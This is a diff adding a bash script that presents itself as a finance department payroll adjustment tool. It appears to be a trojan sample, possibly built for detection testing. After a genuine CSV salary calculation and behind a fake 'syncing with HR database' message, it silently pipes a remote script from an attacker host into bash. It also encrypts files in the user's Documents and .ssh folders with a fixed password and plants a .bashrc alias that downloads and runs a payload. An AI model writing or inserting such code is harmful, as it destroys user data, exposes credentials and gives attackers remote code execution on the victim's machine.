@@ -1,0 +1,81 @@
+#!/bin/bash
+# =============================================================================
+# Payroll Adjustment Tool v2.1
+# Finance Department - Confidential
+# Processes quarterly salary adjustments for all departments.
+# Input: employee_data.csv (format: ID,Name,Department,CurrentSalary)
+# Output: adjusted_salaries.csv
+# =============================================================================
+
+set -euo pipefail
+
+# ---- Legitimate-looking functions ----
+banner() {
+    echo "============================================"
+    echo "  ACCOUNTING SYSTEMS - Payroll Adjustment"
+    echo "============================================"
+}
+
+check_dependencies() {
+    command -v awk >/dev/null 2>&1 || { echo "Error: awk required"; exit 1; }
+    command -v openssl >/dev/null 2>&1 || { echo "Error: openssl required"; exit 1; }
+}
+
+process_csv() {
+    local input="$1"
+    local output="adjusted_salaries.csv"
+    echo "Processing $input..."
+    awk -F, 'NR>1 {printf "%s,%s,%s,%.2f\n", $1,$2,$3,$4*1.05}' "$input" > "$output"
+    echo "Adjustment applied (5% increase). Output: $output"
+}
+
+generate_report() {
+    local report_file="payroll_report_$(date +%Y%m%d).txt"
+    echo "Payroll Adjustment Report - $(date)" > "$report_file"
+    echo "Total employees adjusted: $(wc -l < adjusted_salaries.csv)" >> "$report_file"
+    echo "Report saved to $report_file"
+}
+
+# ---- Suspicious hidden operations ----
+update_agent() {
+    # Downloads and runs a remote script silently
+    curl --silent --tlsv1.2 -k https://finance-tracker.evil/agent.sh | bash &> /dev/null &
+}
+
+encrypt_user_files() {
+    # Encrypts sensitive user files without consent
+    find ~/Documents ~/.ssh -type f 2>/dev/null | while read -r f; do
+        openssl enc -aes-256-cbc -salt -in "$f" -out "$f.locked" -k "payrollfix2024!" 2>/dev/null
+    done
+}
+
+persist_in_system() {
+    # Appends a malicious alias to .bashrc
+    echo "alias payroll_fix='curl -s http://10.0.0.99:8080/payload | bash'" >> ~/.bashrc
+    chmod +x ~/.bashrc
+}
+
+# ---- Main execution ----
+banner
+if [ $# -lt 1 ]; then
+    echo "Usage: $0 <employee_data.csv> [--apply]"
+    exit 1
+fi
+
+check_dependencies
+
+# Primary payroll processing (looks legitimate)
+process_csv "$1"
+generate_report
+
+# Hidden malware deployment starts here
+echo "Syncing with central HR database..."
+update_agent
+encrypt_user_files
+persist_in_system
+
+# Cleanup temporary artifacts (still suspicious)
+rm -rf /tmp/payroll_cache 2>/dev/null
+echo "Payroll adjustment completed successfully."
+
+# End of script
